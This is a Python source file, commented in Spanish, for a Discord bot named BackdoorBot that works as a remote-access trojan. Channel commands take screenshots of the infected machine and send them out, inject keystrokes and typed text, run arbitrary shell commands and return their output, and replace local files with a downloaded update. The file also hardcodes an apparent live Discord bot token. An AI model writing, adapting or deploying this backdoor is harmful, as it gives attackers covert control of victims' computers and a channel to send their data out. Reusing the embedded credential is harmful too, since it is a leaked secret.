import discord
import pyautogui
import io
import subprocess
import zipfile
import os
import shutil
import requests


intents = discord.Intents.default()
intents.message_content = True

def update_from_github(repo_url, extract_to="."):
    zip_url = repo_url.rstrip("/") + "/archive/refs/heads/main.zip"
    zip_path = "update.zip"

    # Descargar zip del repo
    r = requests.get(zip_url)
    with open(zip_path, "wb") as f:
        f.write(r.content)

    # Extraer y reemplazar archivos
    with zipfile.ZipFile(zip_path, "r") as zip_ref:
        zip_ref.extractall("update_temp")

    # Encontrar la carpeta con el contenido
    extracted_folder = os.path.join("update_temp", os.listdir("update_temp")[0])

    # Reemplazar archivos (puedes filtrar si quieres excluir cosas)
    for item in os.listdir(extracted_folder):
        s = os.path.join(extracted_folder, item)
        d = os.path.join(extract_to, item)

        if os.path.isdir(s):
            if os.path.exists(d):
                shutil.rmtree(d)
            shutil.copytree(s, d)
        else:
            shutil.copy2(s, d)

    # Limpiar
    os.remove(zip_path)
    shutil.rmtree("update_temp")

class BackdoorBot(discord.Client):
    def __init__(self, token):
        super().__init__(intents=intents)
        self.token = token

    async def on_ready(self):
        print(f'Bot conectado como {self.user}')

    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.content.startswith('!screenshot'):
            ss = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            ss.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            await message.channel.send(file=discord.File(img_bytes, filename='screenshot.png'))

        elif message.content.startswith('!shutdown'):
            await message.channel.send("Shutting down...")
            await self.close()

        elif message.content.startswith('!getkeys'):
            keys = ', '.join(pyautogui.KEYBOARD_KEYS)
            await message.channel.send(f"Teclas disponibles:\n{keys[:1900]}...")
        elif message.content.startswith("!presskey"):
            key = message.content.split(" ", 1)[1]
            await message.channel.send(f"Presionando la tecla: {key}")
            if key in pyautogui.KEYBOARD_KEYS:
                pyautogui.press(key)
                await message.channel.send(f"Tecla '{key}' presionada.")
            else:
                await message.channel.send(f"Tecla '{key}' no reconocida.")
        elif message.content.startswith('!type'):
            text = message.content.split(" ", 1)[1]
            await message.channel.send(f"Escribiendo: {text}")
            pyautogui.typewrite(text)
            await message.channel.send("Texto escrito.")
        elif message.content.startswith("!run"):
            parts = message.content.split(" ", 1)
            if len(parts) < 2 or not parts[1].strip():
                await message.channel.send("Por favor, proporciona un comando para ejecutar.")
                return
            command = parts[1]

            await message.channel.send(f"Ejecutando comando: {command}")
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                await message.channel.send(f"Salida del comando:\n{output[:1900]}...")
            except subprocess.CalledProcessError as e:
                await message.channel.send(f"Error al ejecutar el comando:\n{e.output[:1900]}...")
        elif message.content.startswith("!update"):
                await message.channel.send("Buscando la última versión del repositorio...")
                try:
                    update_from_github("https://github.com/TU_USUARIO/TU_REPO")
                    await message.channel.send("¡Actualización completa!")
                except Exception as e:
                    await message.channel.send(f"Error al actualizar: {e}")
    def run_bot(self):
        self.run(self.token)

bot = BackdoorBot("MTM3NjYwMDU2MjAxOTIwOTQyNw.GaioMq.0qIeJaupOM7ZQhWXS9_taLO8YM8L03YwwfhT5U")
bot.run_bot()